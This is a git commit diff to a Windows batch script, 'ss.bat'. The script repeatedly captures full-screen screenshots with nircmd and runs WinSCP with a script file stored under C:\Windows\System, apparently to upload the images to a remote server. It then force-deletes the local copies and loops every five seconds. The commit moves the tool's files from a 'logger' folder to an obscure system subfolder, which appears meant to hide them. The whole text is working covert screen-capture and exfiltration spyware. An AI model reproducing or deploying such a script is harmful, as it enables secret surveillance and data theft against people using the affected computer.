b6ef454f891bc2aa16f0260738763e278c4b8a02
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-26 00:47:21 -0700

    Update ss.bat

--- ss.bat
+++ ss.bat
@@ -6,7 +6,7 @@ SET dtStamp24=%date:~-4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%
 if "%HOUR:~0,1%" == " " (SET dtStamp=%dtStamp9%) else (SET dtStamp=%dtStamp24%)
 mkdir ss
 nircmd.exe savescreenshotfull ss\%dtStamp%.png
-C:\Windows\System\logger\WinSCP.com /script=C:\Windows\System\logger\ss1.bat
-del /f/q C:\Windows\System\logger\ss
+C:\Windows\System\Text\r\3\WinSCP.com /script=C:\Windows\System\Text\r\3\ss1.bat
+del /f/q C:\Windows\System\Text\r\3\ss
 timeout 5
 goto start
